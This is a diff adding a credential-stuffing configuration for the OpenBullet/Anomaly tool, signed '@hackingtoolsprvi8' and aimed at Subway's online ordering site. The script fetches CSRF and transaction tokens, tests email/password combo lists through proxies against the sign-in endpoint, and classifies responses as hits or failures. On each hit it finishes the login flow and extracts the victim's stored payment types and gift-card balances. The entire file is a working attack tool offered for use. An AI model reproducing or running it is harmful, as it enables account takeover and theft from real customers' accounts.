@@ -1,0 +1,189 @@
+[SETTINGS]
+{
+  "Name": "Subway(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-17T18:03:05.5824539+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://order.subway.com/en/signin?url=/" 
+  
+  HEADER "Host: order.subway.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://order.subway.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "transId\":\"" 
+
+PARSE "<SOURCE>" LR "transId\":\"" "\"" -> VAR "transId" 
+
+PARSE "<SOURCE>" LR "\"csrf\":\"" "\"" -> VAR "csrf" 
+
+FUNCTION RandomString "user_?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "a" 
+
+REQUEST POST "https://id.subway.com/02d64b66-5494-461d-8e0d-5c72dc1efa7f/B2C_1A_signup_signin-r2/SelfAsserted/<a>?tx=<transId>&p=B2C_1A_signup_signin-r2" 
+  CONTENT "request_type=RESPONSE&signInName=<USER>&password=<PASS>&adobeAnalyticsTag=__IGNORE" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: id.subway.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 108" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" 
+  HEADER "X-CSRF-TOKEN: <csrf>" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://id.subway.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: <ADDRESS>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password is incorrect" 
+    KEY "This field is required" 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"200\"}" 
+
+REQUEST GET "https://id.subway.com/02d64b66-5494-461d-8e0d-5c72dc1efa7f/B2C_1A_signup_signin-r2/api/CombinedSigninAndSignup/<a>/confirmed?csrf_token=<csrf>&tx=<transId>&p=B2C_1A_signup_signin-r2" 
+  
+  HEADER "Host: id.subway.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 108" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" 
+  HEADER "X-CSRF-TOKEN: <csrf>" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://id.subway.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: <ADDRESS>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "code' value='" "'" -> VAR "code" 
+
+PARSE "<SOURCE>" LR "name='id_token' id='id_token' value='" "'" -> VAR "id_token" 
+
+PARSE "<SOURCE>" LR "name='state' id='state' value='" "'" EncodeOutput=TRUE -> VAR "state" 
+
+REQUEST POST "https://order.subway.com/" 
+  CONTENT "state=<state>&code=<code>&id_token=<id_token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: order.subway.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 2684" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://id.subway.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://id.subway.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+REQUEST POST "https://order.subway.com/RemoteOrder/Payments/GetStoredPaymentsAsync" 
+  CONTENT "sitename=remoteorderen-US" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: nl-NL,nl;q=0.9" 
+  HEADER "content-length: 25" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "origin: https://order.subway.com" 
+  HEADER "referer: https://order.subway.com/en-us/profile/paymentmethods" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+PARSE "<SOURCE>" LR "var savedPayments = " ";" -> VAR "payments" 
+
+PARSE "<payments>" JSON "PaymentType" Recursive=TRUE CreateEmpty=FALSE -> CAP "Payments" 
+
+PARSE "<payments>" JSON "usd" Recursive=TRUE CreateEmpty=FALSE -> CAP "GC-Balance(s)" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Payments>" EqualTo "[]" 
+    KEY "<Payments>" DoesNotExist 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
